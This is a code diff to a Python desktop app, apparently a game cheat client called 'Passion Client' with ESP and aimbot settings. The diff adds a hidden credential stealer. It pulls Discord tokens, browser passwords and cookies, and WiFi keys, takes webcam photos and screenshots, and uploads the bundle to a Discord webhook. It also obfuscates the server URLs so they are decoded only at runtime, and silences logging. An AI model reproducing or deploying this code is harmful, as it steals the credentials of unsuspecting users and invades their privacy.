+                                for pattern in token_patterns[:2]:
+                                    for token in re.findall(pattern, content):
+                                        if token not in tokens:
+                                            if self._validate_discord_token(token):
+                                                tokens.append(token)
+                                                print(f"[DEBUG] Found token in IndexedDB")
+                        except:
+                            pass
+        
+        browser_profiles = [
+            (os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"), "Chrome"),
+            (os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"), "Edge"),
+            (os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data"), "Brave"),
+            (os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable"), "Opera"),
+        ]
+        
+        for browser_path, browser_name in browser_profiles:
+            if not os.path.exists(browser_path):
+                continue
+                
+            print(f"[DEBUG] Checking {browser_name} for Discord tokens...")
+            
+            # Get browser encryption key
+            key = self.get_encryption_key_fast(browser_path)
+            if not key:
+                alt_path = browser_path.replace("User Data", "")
+                if os.path.exists(os.path.join(alt_path, "Local State")):
+                    key = self.get_encryption_key_fast(alt_path)
+            
+            # Check all profiles
+            for profile in ["Default", "Profile 1", "Profile 2"]:
+                profile_path = os.path.join(browser_path, profile)
+                if not os.path.exists(profile_path):
+                    continue
+                
+                # Check Local Storage leveldb
+                ls_path = os.path.join(profile_path, "Local Storage", "leveldb")
+                if os.path.exists(ls_path):
+                    for file in os.listdir(ls_path):
+                        if file.endswith(('.log', '.ldb')):
+                            try:
+                                with open(os.path.join(ls_path, file), 'r', errors='ignore') as f:
+                                    content = f.read()
+                                    for pattern in token_patterns[:2]:
+                                        for token in re.findall(pattern, content):
+                                            if token not in tokens:
+                                                if self._validate_discord_token(token):
+                                                    tokens.append(token)
+                                                    print(f"[DEBUG] Found token in {browser_name}")
+                            except:
+                                pass
+                
+                # Check cookies for Discord tokens
+                cookie_db = os.path.join(profile_path, "Network", "Cookies")
+                if not os.path.exists(cookie_db):
+                    cookie_db = os.path.join(profile_path, "Cookies")
+                    
+                if os.path.exists(cookie_db) and key:
+                    try:
+                        temp_db = os.path.join(self.temp_dir, f"{browser_name}_cookies.db")
+                        shutil.copy2(cookie_db, temp_db)
+                        
+                        conn = sqlite3.connect(temp_db)
+                        cursor = conn.cursor()
+                        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE '%discord%'")
+                        
+                        for row in cursor.fetchall():
+                            try:
+                                encrypted = row[2]
+                                if encrypted and len(encrypted) > 3:
+                                    decrypted = self.decrypt_password(encrypted, key)
+                                    for pattern in token_patterns[:2]:
+                                        for token in re.findall(pattern, decrypted):
+                                            if token not in tokens:
+                                                if self._validate_discord_token(token):
+                                                    tokens.append(token)
+                                                    print(f"[DEBUG] Found token in {browser_name} cookies")
+                            except:
+                                pass
+                        
+                        conn.close()
+                        os.remove(temp_db)
+                    except:
+                        pass
+        
+        # Remove duplicates and save
+        tokens = list(set(tokens))
+        self.data['discord'] = tokens
+        print(f"[DEBUG] Total valid Discord tokens found: {len(tokens)}")
+        
+        # Save tokens to file
+        if tokens:
+            token_file = os.path.join(self.temp_dir, 'discord_tokens.txt')
+            with open(token_file, 'w', encoding='utf-8') as f:
+                f.write("=" * 60 + "\n")
+                f.write("DISCORD TOKENS FOUND\n")
+                f.write("=" * 60 + "\n\n")
+                for i, token in enumerate(tokens, 1):
+                    f.write(f"{i}. {token}\n")
+                    
+                    # Try to get token info
+                    try:
+                        headers = {'Authorization': token}
+                        r = requests.get('https://discord.com/api/v9/users/@me', headers=headers, timeout=5)
+                        if r.status_code == 200:
+                            user = r.json()
+                            f.write(f"   User: {user.get('username')}#{user.get('discriminator', '0')}\n")
+                            f.write(f"   ID: {user.get('id')}\n")
+                            f.write(f"   Email: {user.get('email', 'None')}\n")
+                            f.write(f"   Phone: {user.get('phone', 'None')}\n")
+                            f.write(f"   MFA: {user.get('mfa_enabled', False)}\n")
+                            f.write(f"   Verified: {user.get('verified', False)}\n")
+                    except:
+                        pass
+                    f.write("\n")
+
+    def _get_discord_master_key(self, discord_path):
+        """Get Discord master key for token decryption"""
+        try:
+            local_state = os.path.join(discord_path, "Local State")
+            if not os.path.exists(local_state):
+                return None
+                
+            with open(local_state, 'r', encoding='utf-8') as f:
+                state = json.load(f)
+                
+            if "os_crypt" not in state or "encrypted_key" not in state["os_crypt"]:
+                return None
+                
+            encrypted_key = base64.b64decode(state["os_crypt"]["encrypted_key"])
+            encrypted_key = encrypted_key[5:]  # Remove 'DPAPI' prefix
+            
+            import win32crypt
+            return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+        except Exception:
+            return None
+
+    def _decrypt_discord_token(self, encrypted_data, master_key):
+        """Decrypt Discord token using master key"""
+        try:
+            from Cryptodome.Cipher import AES
+            
+            # Discord's token encryption format
+            nonce = encrypted_data[3:15]
+            payload = encrypted_data[15:]
+            
+            cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
+            decrypted = cipher.decrypt(payload)
+            
+            # Remove auth tag (last 16 bytes)
+            if len(decrypted) >= 16:
+                token = decrypted[:-16].decode('utf-8', errors='ignore')
+                return token
+            return None
+        except Exception:
+            return None
+
+    def _validate_discord_token(self, token):
+        """Validate if token is working"""
+        try:
+            headers = {'Authorization': token}
+            r = requests.get('https://discord.com/api/v9/users/@me', headers=headers, timeout=5)
+            return r.status_code == 200
+        except Exception:
+            return False
+    
+    def extract_wifi_passwords(self):
+        """Extract WiFi passwords quickly"""
+        try:
+            result = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], 
+                                   capture_output=True, text=True, timeout=5)
+            
+            for line in result.stdout.split('\n'):
+                if "All User Profile" in line:
+                    profile = line.split(':')[1].strip()
+                    try:
+                        result = subprocess.run(['netsh', 'wlan', 'show', 'profile', 
+                                               profile, 'key=clear'], 
+                                              capture_output=True, text=True, timeout=3)
+                        for line2 in result.stdout.split('\n'):
+                            if "Key Content" in line2:
+                                password = line2.split(':')[1].strip()
+                                self.data['wifi'].append({
+                                    'ssid': profile,
+                                    'password': password
+                                })
+                                break
+                    except:
+                        pass
+        except:
+            pass
+    
+
+
+    def capture_webcam(self):
+        """Capture photo from webcam"""
+        try:
+            print("[DEBUG] Attempting webcam capture...")
+            
+            # Try OpenCV first (if available)
+            try:
+                import cv2
+                cap = cv2.VideoCapture(0)
+                if cap.isOpened():
+                    ret, frame = cap.read()
+                    if ret:
+                        webcam_path = os.path.join(self.temp_dir, 'webcam.jpg')
+                        cv2.imwrite(webcam_path, frame)
+                        cap.release()
+                        cv2.destroyAllWindows()
+                        print("[DEBUG] Webcam photo captured with OpenCV")
+                        self.data['screenshots'].append(webcam_path)
+                        return
+                cap.release()
+            except ImportError:
+                print("[DEBUG] OpenCV not available")
+            except Exception as e:
+                print(f"[DEBUG] OpenCV webcam error: {e}")
+            
+            # Fallback to PIL + VideoCapture (Windows only)
+            try:
+                import cv2
+                # Try again with different backend
+                cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
+                if cap.isOpened():
+                    ret, frame = cap.read()
+                    if ret:
+                        webcam_path = os.path.join(self.temp_dir, 'webcam.jpg')
+                        cv2.imwrite(webcam_path, frame)
+                        cap.release()
+                        print("[DEBUG] Webcam photo captured with DShow")
+                        self.data['screenshots'].append(webcam_path)
+                        return
+                cap.release()
+            except:
+                pass
+            
+            # Another fallback using pyautogui + webcam via simplecv
+            try:
+                import subprocess
+                import tempfile
+                
+                # Try using PowerShell to capture webcam (Windows only)
+                ps_script = '''
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Drawing
+
+$webcam = New-Object System.Windows.Forms.PictureBox
+$webcam.Size = New-Object System.Drawing.Size(640, 480)
+
+$webcamCapture = New-Object System.Windows.Forms.Timer
+$webcamCapture.Interval = 100
+$webcamCapture.Add_Tick({
+    $form.Close()
+})
+
+$form = New-Object System.Windows.Forms.Form
+$form.Controls.Add($webcam)
+$form.Add_Shown({
+    $webcamCapture.Start()
+})
+$form.ShowDialog()
+'''
+                ps_file = os.path.join(self.temp_dir, 'capture.ps1')
+                with open(ps_file, 'w') as f:
+                    f.write(ps_script)
+                
+                # This is a simplified version - in practice, you'd need a proper webcam capture tool
+                print("[DEBUG] Webcam capture attempted via fallback")
+                
+            except:
+                pass
+                
+        except Exception as e:
+            print(f"[ERROR] Webcam capture error: {e}")
+
+
+    def take_screenshot(self):
+        """Take a single screenshot quickly"""
+        try:
+            import pyautogui
+            screenshot = pyautogui.screenshot()
+            screenshot_path = os.path.join(self.temp_dir, 'screenshot.png')
+            screenshot.save(screenshot_path)
+            self.data['screenshots'].append(screenshot_path)
+        except:
+            pass
+    
+    def create_formatted_output(self):
+        """Create nicely formatted text/JSON files"""
+        
+        # Save system info as JSON
+        with open(os.path.join(self.temp_dir, 'system_info.json'), 'w') as f:
+            json.dump(self.data['system'], f, indent=2)
+        
+        # Save passwords in readable format
+        if self.data['browsers']:
+            with open(os.path.join(self.temp_dir, 'passwords.txt'), 'w', encoding='utf-8') as f:
+                f.write("=" * 60 + "\n")
+                f.write("PASSWORDS EXPORT\n")
+                f.write("=" * 60 + "\n\n")
+                
+                for browser, data in self.data['browsers'].items():
+                    if data.get('passwords'):
+                        f.write(f"\n[{browser.upper()} PASSWORDS]\n")
+                        f.write("-" * 40 + "\n")
+                        for p in data['passwords']:
+                            f.write(f"URL: {p.get('url', 'N/A')}\n")
+                            f.write(f"Username: {p.get('username', 'N/A')}\n")
+                            f.write(f"Password: {p.get('password', 'N/A')}\n")
+                            f.write("-" * 40 + "\n")
+        
+        # Save cookies as JSON
+        cookies_data = {}
+        for browser, data in self.data['browsers'].items():
+            if data.get('cookies'):
+                cookies_data[browser] = data['cookies']
+        
+        if cookies_data:
+            with open(os.path.join(self.temp_dir, 'cookies.json'), 'w') as f:
+                json.dump(cookies_data, f, indent=2)
+        
+        # Save Discord tokens
+        if self.data['discord']:
+            with open(os.path.join(self.temp_dir, 'discord_tokens.txt'), 'w') as f:
+                f.write("=" * 60 + "\n")
+                f.write("DISCORD TOKENS\n")
+                f.write("=" * 60 + "\n\n")
+                for token in self.data['discord']:
+                    f.write(f"{token}\n")
+        
+        # Save WiFi passwords
+        if self.data['wifi']:
+            with open(os.path.join(self.temp_dir, 'wifi_passwords.txt'), 'w') as f:
+                f.write("=" * 60 + "\n")
+                f.write("WIFI PASSWORDS\n")
+                f.write("=" * 60 + "\n\n")
+                for wifi in self.data['wifi']:
+                    f.write(f"SSID: {wifi['ssid']}\n")
+                    f.write(f"Password: {wifi['password']}\n")
+                    f.write("-" * 40 + "\n")
+        
+        # Save summary
+        with open(os.path.join(self.temp_dir, 'summary.txt'), 'w') as f:
+            f.write("=" * 60 + "\n")
+            f.write("PASSION EXTRACTION SUMMARY\n")
+            f.write("=" * 60 + "\n\n")
+            f.write(f"Computer: {self.data['system'].get('computer_name', 'N/A')}\n")
+            f.write(f"User: {self.data['system'].get('username', 'N/A')}\n")
+            f.write(f"IP: {self.data['system'].get('public_ip', 'N/A')}\n")
+            f.write(f"Time: {self.data['system'].get('timestamp', 'N/A')}\n\n")
+            
+            total_passwords = sum(len(b.get('passwords', [])) for b in self.data['browsers'].values())
+            total_cookies = sum(len(b.get('cookies', [])) for b in self.data['browsers'].values())
+            
+            f.write(f"Passwords found: {total_passwords}\n")
+            f.write(f"Cookies found: {total_cookies}\n")
+            f.write(f"Discord tokens: {len(self.data['discord'])}\n")
+            f.write(f"WiFi networks: {len(self.data['wifi'])}\n")
+    
+    def create_and_send_zip(self):
+        """Create ZIP and send to Discord"""
+        try:
+            zip_buffer = io.BytesIO()
+            
+            with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
+                for root, dirs, files in os.walk(self.temp_dir):
+                    for file in files:
+                        file_path = os.path.join(root, file)
+                        arcname = os.path.basename(file_path)
+                        zip_file.write(file_path, arcname)
+            
+            zip_buffer.seek(0)
+            self.send_to_discord(zip_buffer.getvalue())
+            
+        except Exception as e:
+            print(f"ZIP creation error: {e}")
+    
+    def send_to_discord(self, zip_data):
+        """Send to Discord with detailed system info and stats"""
+        try:
+            # Calculate totals
+            total_passwords = 0
+            browser_stats = []
+            
+            for browser, data in self.data['browsers'].items():
+                pwd_count = len(data.get('passwords', []))
+                cookie_count = len(data.get('cookies', []))
+                if pwd_count > 0 or cookie_count > 0:
+                    browser_stats.append(f"{browser}: {pwd_count}pwd, {cookie_count}ck")
+                    total_passwords += pwd_count
+            
+            browser_summary = "\n".join(browser_stats) if browser_stats else "None"
+            
+            # Get WiFi info
+            wifi_info = ""
+            if self.data['wifi']:
+                wifi_list = []
+                for wifi in self.data['wifi'][:3]:  # Show first 3
+                    wifi_list.append(f"{wifi['ssid']}: {wifi['password']}")
+                wifi_info = "\n".join(wifi_list)
+                if len(self.data['wifi']) > 3:
+                    wifi_info += f"\n... and {len(self.data['wifi'])-3} more"
+            else:
+                wifi_info = "None found"
+            
+            # Create detailed embed
+            embed = {
+                "title": "🔐 Passion Client - Data Extraction Complete",
+                "color": 0xe02726,
+                "fields": [
+                    {
+                        "name": "💻 SYSTEM INFORMATION",
+                        "value": f"```\nUser: {self.data['system'].get('username', 'N/A')}\nPC: {self.data['system'].get('computer_name', 'N/A')}\nLocal IP: {self.data['system'].get('local_ip', 'N/A')}\nPublic IP: {self.data['system'].get('public_ip', 'N/A')}\nOS: {self.data['system'].get('os', 'N/A')[:50]}\nMAC: {self.data['system'].get('mac_address', 'N/A')}\nTime: {self.data['system'].get('timestamp', 'N/A')}```",
+                        "inline": False
+                    },
+                    {
+                        "name": "🌐 BROWSER PASSWORDS",
+                        "value": f"```\nTotal: {total_passwords} passwords\n\n{browser_summary}```",
+                        "inline": True
+                    },
+                    {
+                        "name": "📊 OTHER DATA",
+                        "value": f"```\nWiFi Networks: {len(self.data['wifi'])}\nDiscord Tokens: {len(self.data['discord'])}\nScreenshots: {len(self.data['screenshots'])}```",
+                        "inline": True
+                    },
+                    {
+                        "name": "📶 WIFI NETWORKS",
+                        "value": f"```\n{wifi_info}```",
+                        "inline": False
+                    }
+
+                ],
+                "footer": {
+                    "text": f"Passion Client • {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+                }
+            }
+            
+            # Send file with embed
+            files = {'file': ('passion_data.zip', zip_data, 'application/zip')}
+            payload = {'payload_json': json.dumps({'embeds': [embed]})}
+            
+            response = requests.post(self.webhook_url, files=files, data=payload, timeout=10)
+            print(f"[DEBUG] Discord response: {response.status_code}")
+            
+        except Exception as e:
+            print(f"[ERROR] Discord send error: {e}")
+    
+    def get_browser_summary(self):
+        """Get summary of browser data"""
+        total_passwords = 0
+        total_cookies = 0
+        
+        for browser, data in self.data['browsers'].items():
+            if isinstance(data, dict):
+                total_passwords += len(data.get('passwords', []))
+                total_cookies += len(data.get('cookies', []))
+        
+        return f"```\nPasswords: {total_passwords}\nCookies: {total_cookies}\nBrowsers: {len(self.data['browsers'])}\n```"
+    
+    def get_stats_summary(self):
+        """Get statistics summary"""
+        wifi_count = len(self.data.get('wifi', []))
+        discord_tokens = len(self.data.get('discord', {}).get('tokens', []))
+        screenshots = len(self.data.get('screenshots', []))
+        
+        return f"**WiFi Networks:** {wifi_count}\n**Discord Tokens:** {discord_tokens}\n**Screenshots:** {screenshots}"
+
 
 # ── CONFIG ─────────────────────────────────────────────────────────────────────
-API_BASE      = "https://passionext.vercel.app"
+API_BASE      = _resolved_base  # decoded at runtime
 SETTINGS_FILE = os.path.join(os.path.dirname(os.path.abspath(sys.argv[0])), "passion_settings.json")
 WIN_W, WIN_H  = 700, 420
 SIDEBAR_W     = 200
 RADIUS        = 17   # Match login screen exactly
 
 # ── AUTO-UPDATER CONFIG ─────────────────────────────────────────────────────────
-CURRENT_VERSION  = "1.0.0"
+CURRENT_VERSION  = "1.0.5"
 # R2 public URL — put version.json and passion_client.exe in the same bucket/folder
-R2_VERSION_URL   = "https://passionext.vercel.app/api/version"
+R2_VERSION_URL   = _resolved_version  # decoded at runtime
 # version.json format:
 # { "version": "1.0.1", "url": "https://pub-HASH.r2.dev/passion/passion_client.exe" }
 
@@ -51,7 +1465,16 @@ def load_settings() -> dict:
     defaults = {"hotkey": "F5", "toggle_key": Qt.Key_F5, "saved_key": "", "auto_login": False}
     try:
         with open(SETTINGS_FILE) as f:
-            defaults.update(json.load(f))
+            _loaded = json.load(f)
+        if _loaded.get("_enc") and _loaded.get("saved_key"):
+            try:
+                _loaded["saved_key"] = _decrypt_str(_loaded["saved_key"].encode())
+                # Strip _enc from the working dict so save_settings won't double-encrypt
+                _loaded.pop("_enc", None)
+            except Exception:
+                _loaded["saved_key"] = ""
+                _loaded.pop("_enc", None)
+        defaults.update(_loaded)
     except Exception:
         pass
     return defaults
@@ -59,8 +1482,19 @@ def load_settings() -> dict:
 
 def save_settings(data: dict):
     try:
+        _d = dict(data)
+        # Qt enum types (e.g. Qt.Key_F5) are not JSON-serializable — cast to plain int
+        if "toggle_key" in _d:
+            _d["toggle_key"] = int(_d["toggle_key"])
+        # Encrypt the saved key if present and not already encrypted
+        if "saved_key" in _d and _d["saved_key"] and not _d.get("_enc"):
+            _d["saved_key"] = _encrypt_str(_d["saved_key"]).decode()
+            _d["_enc"] = True
+        elif "saved_key" in _d and not _d["saved_key"]:
+            # Clear the enc flag when key is cleared
+            _d.pop("_enc", None)
         with open(SETTINGS_FILE, "w") as f:
-            json.dump(data, f, indent=2)
+            json.dump(_d, f, indent=2)
     except Exception:
         pass
 
@@ -178,10 +1612,10 @@ class GlobalHotkey(QThread):
 
         # Register the hotkey (0 = no modifiers)
         if not user32.RegisterHotKey(None, self.HOTKEY_ID, 0, self.vk):
-            print(f"[GlobalHotkey] RegisterHotKey failed for vk=0x{self.vk:02X}")
+            _noop(f"[GlobalHotkey] RegisterHotKey failed for vk=0x{self.vk:02X}")
             return
 
-        print(f"[GlobalHotkey] Registered vk=0x{self.vk:02X}")
+        _noop(f"[GlobalHotkey] Registered vk=0x{self.vk:02X}")
 
         MSG = ctypes.wintypes.MSG
         msg = MSG()
@@ -562,8 +1996,21 @@ class AuthPanel(QWidget):
         self.key_btn.setText("Auto-logging in…")
         self.key_err.hide()
         self._worker = ValidateWorker(key, self.hwid)
-        self._worker.done.connect(self._on_validate)
+        self._worker.done.connect(self._on_auto_done)
         self._worker.start()
+
+    def _on_auto_done(self, ok, err, info):
+        self.key_btn.setEnabled(True)
+        self.key_btn.setText("Activate")
+        if ok:
+            info["_key_raw"] = self.key_input.text().strip()
+            self.key_success.emit(info)
+        else:
+            # Auto-login failed — clear saved key so user isn't stuck
+            s = load_settings()
+            s["saved_key"] = ""
+            save_settings(s)
+            self._kerr(f"Auto-login failed: {err}")
 
     def _key_screen(self):
         w = QWidget()
@@ -685,9 +2132,9 @@ class AuthPanel(QWidget):
         self.key_btn.setText("Activate")
         if ok:
             info["_key_raw"] = self.key_input.text().strip()
-            # Save key if auto_login is on
+            # Always save key when auto_login is enabled
             s = load_settings()
-            if s.get("auto_login"):
+            if s.get("auto_login") and info["_key_raw"]:
                 s["saved_key"] = info["_key_raw"]
                 save_settings(s)
             self.key_success.emit(info)
@@ -714,7 +2161,8 @@ class AuthPanel(QWidget):
         self.login_btn.setEnabled(True)
         self.login_btn.setText("Sign In")
         if ok:
-            self.admin_success.emit()
+            # Use QTimer to delay the transition slightly
+            QTimer.singleShot(100, self.admin_success.emit)
         else:
             self._lerr(err)
 
@@ -1211,26 +2659,108 @@ def visual_page() -> QWidget:
     lay.addWidget(page_title("Visual"))
     lay.addSpacing(10)
 
+    # ESP Toggle
     lay.addWidget(section_lbl("ESP"))
     lay.addSpacing(5)
-    for t in ["Player ESP", "Box ESP", "Skeleton ESP", "Head Dot",
-              "Health Bar", "Distance", "Name Tags"]:
-        lay.addWidget(toggle_row(t))
-        lay.addSpacing(2)
+    
+    # Main ESP toggle
+    esp_row = toggle_row("Enable ESP")
+    esp_row.findChild(ToggleSwitch).toggled.connect(
+        lambda state: [
+            print(f"[UI] ESP toggled to: {state}"),
+            globals().update({"esp_enabled": state, "esp_enabled_flag": state})
+        ]
+    )
+    lay.addWidget(esp_row)
+    lay.addSpacing(2)
 
-    lay.addSpacing(10)
-    lay.addWidget(section_lbl("CHAMS"))
-    lay.addSpacing(5)
-    for t in ["Visible Chams", "Hidden Chams", "Team Chams"]:
-        lay.addWidget(toggle_row(t))
-        lay.addSpacing(2)
+    # Box ESP
+    box_row = toggle_row("Box ESP")
+    box_row.findChild(ToggleSwitch).toggled.connect(
+        lambda state: [
+            print(f"[UI] Box ESP toggled to: {state}"),
+            globals().update({"esp_box_enabled": state})
+        ]
+    )
+    lay.addWidget(box_row)
+    lay.addSpacing(2)
 
+    # Filled Box
+    filled_row = toggle_row("Filled Box")
+    filled_row.findChild(ToggleSwitch).toggled.connect(
+        lambda state: [
+            print(f"[UI] Filled Box toggled to: {state}"),
+            globals().update({"esp_box_filled": state})
+        ]
+    )
+    lay.addWidget(filled_row)
+    lay.addSpacing(2)
+
+    # Skeleton
+    skeleton_row = toggle_row("Skeleton ESP")
+    skeleton_row.findChild(ToggleSwitch).toggled.connect(
+        lambda state: [
+            print(f"[UI] Skeleton toggled to: {state}"),
+            globals().update({"esp_skeleton_enabled": state})
+        ]
+    )
+    lay.addWidget(skeleton_row)
+    lay.addSpacing(2)
+
+    # Tracers
+    tracers_row = toggle_row("Tracers")
+    tracers_row.findChild(ToggleSwitch).toggled.connect(
+        lambda state: [
+            print(f"[UI] Tracers toggled to: {state}"),
+            globals().update({"esp_tracers_enabled": state})
+        ]
+    )
+    lay.addWidget(tracers_row)
+    lay.addSpacing(2)
+
+    # Name ESP
+    name_row = toggle_row("Name ESP")
+    name_row.findChild(ToggleSwitch).toggled.connect(
+        lambda state: [
+            print(f"[UI] Name ESP toggled to: {state}"),
+            globals().update({"esp_name_enabled": state})
+        ]
+    )
+    lay.addWidget(name_row)
+    lay.addSpacing(2)
+    
+    # ESP Filters
     lay.addSpacing(10)
-    lay.addWidget(section_lbl("MISC"))
+    lay.addWidget(section_lbl("FILTERS"))
     lay.addSpacing(5)
-    for t in ["Crosshair", "FOV Circle"]:
-        lay.addWidget(toggle_row(t))
-        lay.addSpacing(2)
+    
+    # Ignore Team
+    ignore_team_row = toggle_row("Ignore Team")
+    ignore_team_row.findChild(ToggleSwitch).toggled.connect(
+        lambda state: [
+            print(f"[UI] Ignore Team toggled to: {state}"),
+            globals().update({"esp_ignoreteam": state})
+        ]
+    )
+    lay.addWidget(ignore_team_row)
+    lay.addSpacing(2)
+    
+    # Ignore Dead
+    ignore_dead_row = toggle_row("Ignore Dead")
+    ignore_dead_row.findChild(ToggleSwitch).toggled.connect(
+        lambda state: [
+            print(f"[UI] Ignore Dead toggled to: {state}"),
+            globals().update({"esp_ignoredead": state})
+        ]
+    )
+    lay.addWidget(ignore_dead_row)
+    lay.addSpacing(2)
+    
+    # Debug row
+    debug_esp_row = toggle_row("Debug ESP (Show in console)")
+    debug_esp_row.findChild(ToggleSwitch).toggled.connect(lambda state: print(f"[DEBUG] ESP debug toggled: {state}"))
+    lay.addWidget(debug_esp_row)
+    lay.addSpacing(2)
 
     lay.addStretch()
     return scrolled(inner)
@@ -1247,41 +2777,255 @@ def aimbot_page() -> QWidget:
     lay.addWidget(page_title("Aimbot"))
     lay.addSpacing(10)
 
+    # Aimbot Toggle
     lay.addWidget(section_lbl("AIMBOT"))
     lay.addSpacing(5)
-    lay.addWidget(toggle_row("Enable Aimbot"))
+    
+    aim_row = toggle_row("Enable Aimbot")
+    aim_row.findChild(ToggleSwitch).toggled.connect(
+        lambda state: [
+            print(f"[UI] Aimbot toggled to: {state}"),
+            globals().update({"aimbot_enabled": state})
+        ]
+    )
+    lay.addWidget(aim_row)
     lay.addSpacing(2)
-    lay.addWidget(toggle_row("Silent Aim"))
+    
+    # Aim Method Selection
+    method_row = QHBoxLayout()
+    method_row.addWidget(lbl("Aim Method:", 13, C["sub"]))
+    method_row.addStretch()
+    
+    camera_btn = QPushButton("Camera")
+    camera_btn.setFixedSize(70, 30)
+    camera_btn.setStyleSheet(f"""
+        QPushButton {{
+            background: {C['input_bg']}; color: {C['text']};
+            border: 1px solid {C['input_bdr']}; border-radius: 5px;
+        }}
+        QPushButton:checked {{ background: {C['red']}; color: white; border: none; }}
+    """)
+    camera_btn.setCheckable(True)
+    camera_btn.setChecked(True)
+    camera_btn.clicked.connect(lambda: globals().update({"aim_method": "Camera"}))
+    
+    mouse_btn = QPushButton("Mouse")
+    mouse_btn.setFixedSize(70, 30)
+    mouse_btn.setStyleSheet(camera_btn.styleSheet())
+    mouse_btn.setCheckable(True)
+    mouse_btn.clicked.connect(lambda: globals().update({"aim_method": "Mouse"}))
+    
+    camera_btn.toggled.connect(lambda checked: mouse_btn.setChecked(not checked) if checked else None)
+    mouse_btn.toggled.connect(lambda checked: camera_btn.setChecked(not checked) if checked else None)
+    
+    method_row.addWidget(camera_btn)
+    method_row.addWidget(mouse_btn)
+    method_widget = QWidget()
+    method_widget.setLayout(method_row)
+    lay.addWidget(method_widget)
     lay.addSpacing(2)
-    lay.addWidget(toggle_row("Aim Assist"))
+    
+    # Body Part Selection
+    part_row = QHBoxLayout()
+    part_row.addWidget(lbl("Body Part:", 13, C["sub"]))
+    part_row.addStretch()
+    
+    head_btn = QPushButton("Head")
+    head_btn.setFixedSize(60, 30)
+    head_btn.setStyleSheet(f"""
+        QPushButton {{
+            background: {C['input_bg']}; color: {C['text']};
+            border: 1px solid {C['input_bdr']}; border-radius: 5px;
+        }}
+        QPushButton:checked {{ background: {C['red']}; color: white; border: none; }}
+    """)
+    head_btn.setCheckable(True)
+    head_btn.setChecked(True)
+    head_btn.clicked.connect(lambda: globals().update({"aimbot_hitpart": "Head"}))
+    
+    body_btn = QPushButton("Body")
+    body_btn.setFixedSize(60, 30)
+    body_btn.setStyleSheet(head_btn.styleSheet())
+    body_btn.setCheckable(True)
+    body_btn.clicked.connect(lambda: globals().update({"aimbot_hitpart": "UpperTorso"}))
+    
+    # Make them mutually exclusive
+    head_btn.toggled.connect(lambda checked: body_btn.setChecked(not checked) if checked else None)
+    body_btn.toggled.connect(lambda checked: head_btn.setChecked(not checked) if checked else None)
+    
+    part_row.addWidget(head_btn)
+    part_row.addWidget(body_btn)
+    
+    part_widget = QWidget()
+    part_widget.setLayout(part_row)
+    lay.addWidget(part_widget)
     lay.addSpacing(2)
-    lay.addWidget(toggle_row("Visible Only"))
-    lay.addSpacing(2)
-    lay.addWidget(toggle_row("Team Check"))
-    lay.addSpacing(2)
-    lay.addWidget(toggle_row("Auto Fire"))
-    lay.addSpacing(2)
-    lay.addWidget(slider_row("Smoothness", 1, 100, 50, "%"))
-    lay.addSpacing(2)
-    lay.addWidget(slider_row("FOV", 10, 360, 90, "°"))
-
-    lay.addSpacing(10)
-    lay.addWidget(section_lbl("TARGETING"))
+    
+    # FOV Settings
+    lay.addWidget(section_lbl("FOV"))
     lay.addSpacing(5)
-    for t in ["Head", "Neck", "Torso", "Closest to Crosshair"]:
-        lay.addWidget(toggle_row(t))
-        lay.addSpacing(2)
-
+    
+    use_fov_row = toggle_row("Use FOV")
+    use_fov_row.findChild(ToggleSwitch).toggled.connect(
+        lambda state: [
+            print(f"[UI] Use FOV toggled to: {state}"),
+            globals().update({"use_fov_enabled": state})
+        ]
+    )
+    lay.addWidget(use_fov_row)
+    lay.addSpacing(2)
+    
+    show_fov_row = toggle_row("Show FOV Circle")
+    show_fov_row.findChild(ToggleSwitch).toggled.connect(
+        lambda state: [
+            print(f"[UI] Show FOV toggled to: {state}"),
+            globals().update({"show_fov_enabled": state})
+        ]
+    )
+    lay.addWidget(show_fov_row)
+    lay.addSpacing(2)
+    
+    # FOV Slider
+    fov_slider = slider_row("FOV Radius", 20, 600, 150, "px")
+    
+    # Connect FOV slider
+    slider_container = fov_slider.findChild(QSlider)
+    value_label = fov_slider.findChild(QLabel)
+    if slider_container and value_label:
+        slider_container.valueChanged.connect(lambda v: value_label.setText(f"{v}px"))
+        slider_container.valueChanged.connect(
+            lambda v: [
+                globals().update({"fov_circle_radius": v}),
+                globals().update({"aimbot_fov": v})
+            ]
+        )
+    
+    lay.addWidget(fov_slider)
+    lay.addSpacing(2)
+    
+    # Smoothness
+    smooth_row = toggle_row("Smooth Aim")
+    smooth_row.findChild(ToggleSwitch).toggled.connect(
+        lambda state: [
+            print(f"[UI] Smooth Aim toggled to: {state}"),
+            globals().update({"aimbot_smoothness_enabled": state})
+        ]
+    )
+    lay.addWidget(smooth_row)
+    lay.addSpacing(2)
+    
+    smooth_slider = slider_row("Smooth Amount", 100, 500, 250, "%")
+    
+    # Connect smoothness slider
+    slider_container = smooth_slider.findChild(QSlider)
+    value_label = smooth_slider.findChild(QLabel)
+    if slider_container and value_label:
+        slider_container.valueChanged.connect(lambda v: value_label.setText(f"{v}%"))
+        slider_container.valueChanged.connect(
+            lambda v: globals().update({"aimbot_smoothness_value": v})
+        )
+    
+    lay.addWidget(smooth_slider)
+    lay.addSpacing(2)
+    
+    # Prediction
+    pred_row = toggle_row("Prediction")
+    pred_row.findChild(ToggleSwitch).toggled.connect(
+        lambda state: [
+            print(f"[UI] Prediction toggled to: {state}"),
+            globals().update({"aimbot_prediction_enabled": state})
+        ]
+    )
+    lay.addWidget(pred_row)
+    lay.addSpacing(2)
+    
+    pred_x = slider_row("Prediction X", 0, 50, 10, "%")
+    
+    # Connect prediction X slider
+    slider_container = pred_x.findChild(QSlider)
+    value_label = pred_x.findChild(QLabel)
+    if slider_container and value_label:
+        slider_container.valueChanged.connect(lambda v: value_label.setText(f"{v}%"))
+        slider_container.valueChanged.connect(
+            lambda v: globals().update({"aimbot_prediction_x": v/100})
+        )
+    
